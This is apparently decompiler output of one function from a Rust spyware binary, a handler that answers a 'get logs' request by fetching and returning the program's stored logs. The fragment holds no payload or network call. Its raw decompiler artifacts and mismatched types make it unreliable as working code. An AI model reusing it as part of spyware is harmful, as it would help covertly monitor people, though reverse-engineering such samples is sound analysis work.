fn spyware::actions::log_actions::get_logs_request() -> : struct52 {
    let a0: i64;  // rdi
    let v0: void*;  // [bp-0x78], Other Possible Types: struct40
    let v1: u64;  // [bp-0x70]
    let v2: struct52;  // [bp-0x68]
    let v3: struct24;  // [bp-0x50], Other Possible Types: u64
    let v4: u64;  // [bp-0x50]
    let v5: u64;  // [sp-0x48]
    let v6: u64;  // [sp-0x40]
    let v7: u64;  // [bp-0x40]
    let v8: struct52;  // [bp-0x40]
    let v9: struct52;  // [bp-0x38], Other Possible Types: u128
    let v10: struct9;  // [bp-0x20]
    let v11: i8;  // [bp-0x10]

    if core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17h115edbfc95f53bc0E, 0) >= 4 {
        v3 = "Got get logs request!";
        v5 = 1;
        v7 = 8;
        v9 = 0;
        v0 = struct40 {
            field_0: "spyware::actions::log_actions"
            field_16: "spyware::actions::log_actions"
            field_32: log::__private_api::loc("src/actions/log_actions.rs")
        };
        log::__private_api::log(&v3, 4, &v0);
    }
    v10 = spyware::logging::core::get_logs();
    if !((((0 ^ *(&v10.field_0 as &i64)) & (0 ^ -(*(&v10.field_0 as &i64)))) >> 63) as char) {
        return struct32 {
            field_0: v10
            field_16: *(&v11 as &i64)
            field_24: 0x8000000000000000
        };
    }
    if core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17h115edbfc95f53bc0E, 0) {
        v4 = "Could not get logs";
        v5 = 1;
        v8 = 8;
        v9 = 0;
        v0 = struct40 {
            field_0: "spyware::actions::log_actions"
            field_16: "spyware::actions::log_actions"
            field_32: log::__private_api::loc("src/actions/log_actions.rs")
        };
        log::__private_api::log(&v4, 1, &v0);
    }
    vvar_160{stack -80} = struct24 OrderedDict([(0, 𝜙@64b [((4546253, None), vvar_107{stack -80}), ((4546309, None), vvar_142{stack -80})]), (16, 𝜙@64b [((4546253, None), vvar_109{stack -64}), ((4546309, None), vvar_144{stack -64})])])
    v0 = 0;
    v1 = 8;
    v2 = 0;
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v3);
    return struct56 {
        field_0: *(&v0 as &i128)
        field_16: 0
        field_24: *(&v3.field_0 as &i128)
        field_40: v6
        field_48: 1
    };
}
